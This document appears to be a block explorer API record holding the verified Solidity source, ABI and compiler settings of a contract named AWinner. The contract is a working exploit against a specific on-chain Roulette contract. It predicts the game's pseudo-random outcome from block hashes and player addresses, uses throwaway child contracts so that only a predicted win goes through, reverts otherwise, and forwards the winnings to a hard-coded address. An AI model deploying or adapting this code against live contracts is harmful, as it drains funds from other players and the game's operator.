{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\n\r\ncontract Roulette {\r\n    function players(uint256 index) public view returns(address);\r\n}\r\n\r\n\r\ncontract Child {\r\n    function() public payable {\r\n    }\r\n    \r\n    function win(address target) public payable {\r\n        require(target.call.value(msg.value)());\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n}\r\n\r\n\r\ncontract AWinner {\r\n    Roulette public roulette = Roulette(0x843311a93665de5a3e7D68909862A1A7412f9BC3);\r\n    \r\n    Child[] public children;\r\n    \r\n    constructor() public payable {\r\n        for (uint i = 0; i < 20; i++) {\r\n            children.push(new Child());\r\n        }\r\n        win();\r\n    }\r\n    \r\n    function win() public payable {\r\n        uint256 prevBalance = address(this).balance;\r\n        for (uint i = getPlayersLength(); i < 4; i++) {\r\n            require(address(roulette).call.value(1 ether)());\r\n        }\r\n        \r\n        for (i = 0; i < children.length; i++) {\r\n            if (getRandom(children[i]) % 5 == 0) {\r\n                children[i].win.value(1 ether)(roulette);\r\n                break;\r\n            }\r\n        }\r\n        \r\n        require(address(this).balance > prevBalance);\r\n        address(0x083fc10cE7e97CaFBaE0fE332a9c4384c5f54E45).transfer(address(this).balance);\r\n    }\r\n    \r\n    function getPlayer(uint256 index) public view returns(address) {\r\n        return roulette.players(index);\r\n    }\r\n    \r\n    function getPlayersLength() public view returns(uint256) {\r\n        for (uint i = 0; i < 10; i++) {\r\n            if (!address(roulette).call.gas(0x400)(abi.encodeWithSelector(roulette.players.selector, i))) {\r\n                return i;\r\n            }\r\n        }\r\n        return 0;\r\n    }\r\n    \r\n    function getRandom(address lastPlayer) internal view returns(uint256) {\r\n        uint256 num = uint256(keccak256(abi.encodePacked(blockhash(block.number - 5), now)));\r\n\r\n        for (uint i = 0; i < 5 - 1; i++) {\r\n            num ^= uint256(keccak256(abi.encodePacked(blockhash(block.number - i), uint256(getPlayer(i)) ^ num)));\r\n        }\r\n        \r\n        num ^= uint256(keccak256(abi.encodePacked(blockhash(block.number - i), uint256(lastPlayer) ^ num)));\r\n\r\n        return num;\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"win\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"children\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getPlayersLength\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"getPlayer\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"roulette\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"}]","ContractName":"AWinner","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://da79038b046afb07222328f471dec84c32184d0bc77bb5a4d723f7026f5e583e"}]}